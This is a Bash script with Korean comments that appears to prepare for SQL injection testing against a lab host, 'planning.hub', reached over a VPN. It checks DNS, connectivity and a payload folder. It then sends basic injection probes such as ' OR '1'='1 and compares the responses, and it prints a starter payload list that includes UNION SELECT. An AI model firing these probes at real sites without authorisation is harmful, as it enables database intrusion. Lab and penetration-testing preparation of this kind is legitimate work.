#!/bin/bash

# SQLi 테스트 전 디버깅 스크립트
# 사용법: ./debug_sqli.sh http://planning.hub/detail.php?id=1 /vpn/SQLi

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

TARGET_URL="$1"
PAYLOAD_DIR="$2"

if [[ -z "$TARGET_URL" ]]; then
    echo -e "${RED}[!]${NC} 사용법: $0 <URL> [페이로드디렉터리]"
    echo "예시: $0 http://planning.hub/detail.php?id=1 /vpn/SQLi"
    exit 1
fi

echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║                    SQLi 디버깅 도구                          ║${NC}"
echo -e "${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}"

# 1. URL 분석
echo -e "${BLUE}[1] URL 분석${NC}"
DOMAIN=$(echo "$TARGET_URL" | sed 's|http[s]*://||' | cut -d'/' -f1)
echo -e "   도메인: ${YELLOW}$DOMAIN${NC}"
echo -e "   전체 URL: ${YELLOW}$TARGET_URL${NC}"

# 2. DNS 해결 확인
echo -e "\n${BLUE}[2] DNS 해결 테스트${NC}"
if nslookup "$DOMAIN" >/dev/null 2>&1; then
    IP=$(nslookup "$DOMAIN" | grep -A1 "Name:" | tail -1 | awk '{print $2}' 2>/dev/null)
    echo -e "   ${GREEN}[+]${NC} DNS 해결 성공: $DOMAIN -> $IP"
else
    echo -e "   ${RED}[!]${NC} DNS 해결 실패: $DOMAIN"
    echo -e "   ${YELLOW}[*]${NC} /etc/hosts 파일 확인 중..."
    if grep -q "$DOMAIN" /etc/hosts 2>/dev/null; then
        HOST_IP=$(grep "$DOMAIN" /etc/hosts | head -1 | awk '{print $1}')
        echo -e "   ${GREEN}[+]${NC} /etc/hosts에서 발견: $DOMAIN -> $HOST_IP"
    else
        echo -e "   ${RED}[!]${NC} /etc/hosts에도 없음"
        echo -e "   ${YELLOW}[해결책]${NC} /etc/hosts에 추가: echo '10.10.10.X planning.hub' >> /etc/hosts"
    fi
fi

# 3. 네트워크 연결 테스트
echo -e "\n${BLUE}[3] 네트워크 연결 테스트${NC}"
if ping -c 1 -W 3 "$DOMAIN" >/dev/null 2>&1; then
    echo -e "   ${GREEN}[+]${NC} PING 성공"
else
    echo -e "   ${RED}[!]${NC} PING 실패"
fi

# HTTP 연결 테스트
echo -e "   HTTP 연결 테스트 중..."
HTTP_CODE=$(curl -s --max-time 5 -o /dev/null -w "%{http_code}" "$TARGET_URL" 2>/dev/null)
if [[ "$HTTP_CODE" =~ ^[2-5][0-9][0-9]$ ]]; then
    echo -e "   ${GREEN}[+]${NC} HTTP 연결 성공 (코드: $HTTP_CODE)"
else
    echo -e "   ${RED}[!]${NC} HTTP 연결 실패 (코드: $HTTP_CODE)"
    echo -e "   ${YELLOW}[시도]${NC} 다른 방법으로 테스트 중..."
    
    # telnet으로 포트 확인
    if command -v nc >/dev/null 2>&1; then
        if nc -z -w3 "$DOMAIN" 80 2>/dev/null; then
            echo -e "   ${YELLOW}[*]${NC} 포트 80은 열려있음 (웹서버 응답 문제)"
        else
            echo -e "   ${RED}[!]${NC} 포트 80 연결 불가"
        fi
    fi
fi

# 4. 페이로드 디렉터리 확인
if [[ -n "$PAYLOAD_DIR" ]]; then
    echo -e "\n${BLUE}[4] 페이로드 디렉터리 확인${NC}"
    if [[ -d "$PAYLOAD_DIR" ]]; then
        echo -e "   ${GREEN}[+]${NC} 디렉터리 존재: $PAYLOAD_DIR"
        
        # 파일 목록
        FILE_COUNT=$(find "$PAYLOAD_DIR" -type f \( -name "*.txt" -o -name "*.list" \) 2>/dev/null | wc -l)
        echo -e "   ${YELLOW}[*]${NC} 페이로드 파일 수: $FILE_COUNT"
        
        echo -e "   ${YELLOW}[*]${NC} 파일 목록:"
        find "$PAYLOAD_DIR" -type f \( -name "*.txt" -o -name "*.list" \) 2>/dev/null | head -10 | while read -r file; do
            SIZE=$(wc -l < "$file" 2>/dev/null || echo "0")
            echo -e "     - $(basename "$file") ($SIZE 줄)"
        done
        
        if [[ $FILE_COUNT -gt 10 ]]; then
            echo -e "     ... 그리고 $((FILE_COUNT - 10))개 더"
        fi
        
    else
        echo -e "   ${RED}[!]${NC} 디렉터리 없음: $PAYLOAD_DIR"
        echo -e "   ${YELLOW}[확인]${NC} 현재 디렉터리 구조:"
        ls -la "$(dirname "$PAYLOAD_DIR")" 2>/dev/null | head -10
    fi
fi

# 5. 간단한 SQLi 테스트 (연결되는 경우)
if [[ "$HTTP_CODE" =~ ^[2-3][0-9][0-9]$ ]]; then
    echo -e "\n${BLUE}[5] 간단한 SQLi 테스트${NC}"
    
    # 정상 응답
    NORMAL_RESPONSE=$(curl -s --max-time 5 "$TARGET_URL" 2>/dev/null)
    NORMAL_LENGTH=${#NORMAL_RESPONSE}
    echo -e "   ${YELLOW}[*]${NC} 정상 응답 길이: $NORMAL_LENGTH bytes"
    
    # 기본 페이로드 테스트
    BASIC_PAYLOADS=("'" "''" "' OR '1'='1" "' AND '1'='2")
    
    for payload in "${BASIC_PAYLOADS[@]}"; do
        BASE_URL="${TARGET_URL%%=*}="
        ENCODED_PAYLOAD=$(printf '%s' "$payload" | curl -Gso /dev/null -w '%{url_effective}' --data-urlencode @- "" | cut -c3-)
        TEST_URL="${BASE_URL}${ENCODED_PAYLOAD}"
        
        TEST_RESPONSE=$(curl -s --max-time 5 "$TEST_URL" 2>/dev/null)
        TEST_LENGTH=${#TEST_RESPONSE}
        DIFF=$((TEST_LENGTH - NORMAL_LENGTH))
        
        if [[ $DIFF -ne 0 ]] || echo "$TEST_RESPONSE" | grep -qi "error\|mysql\|syntax"; then
            echo -e "   ${GREEN}[+]${NC} 반응 있음: '$payload' (길이차: $DIFF)"
        else
            echo -e "   ${YELLOW}[-]${NC} 반응 없음: '$payload'"
        fi
    done
fi

# 6. 해결책 제시
echo -e "\n${BLUE}[6] 해결책${NC}"

if [[ "$HTTP_CODE" != "200" ]]; then
    echo -e "${YELLOW}네트워크 문제 해결:${NC}"
    echo -e "1. VPN 연결 확인: ${CYAN}ip a${NC} 또는 ${CYAN}ifconfig tun0${NC}"
    echo -e "2. /etc/hosts 추가: ${CYAN}echo '10.10.10.X planning.hub' >> /etc/hosts${NC}"
    echo -e "3. 방화벽 확인: ${CYAN}iptables -L${NC}"
    echo -e "4. 다른 서비스 테스트: ${CYAN}nmap -p 80,443 planning.hub${NC}"
fi

if [[ -n "$PAYLOAD_DIR" && ! -d "$PAYLOAD_DIR" ]]; then
    echo -e "${YELLOW}페이로드 디렉터리 문제 해결:${NC}"
    echo -e "1. 경로 확인: ${CYAN}ls -la /vpn/${NC}"
    echo -e "2. 페이로드 생성: ${CYAN}mkdir -p /vpn/SQLi${NC}"
    echo -e "3. 기본 페이로드 생성:"
    echo -e "   ${CYAN}cat > /vpn/SQLi/basic.txt << 'EOF'"
    echo -e "'"
    echo -e "''"
    echo -e "' OR '1'='1"
    echo -e "' OR 1=1--"
    echo -e "' OR 1=1#"
    echo -e "' UNION SELECT NULL--"
    echo -e "EOF${NC}"
fi

echo -e "\n${GREEN}[완료]${NC} 디버깅 완료. 위 정보를 바탕으로 문제를 해결하세요."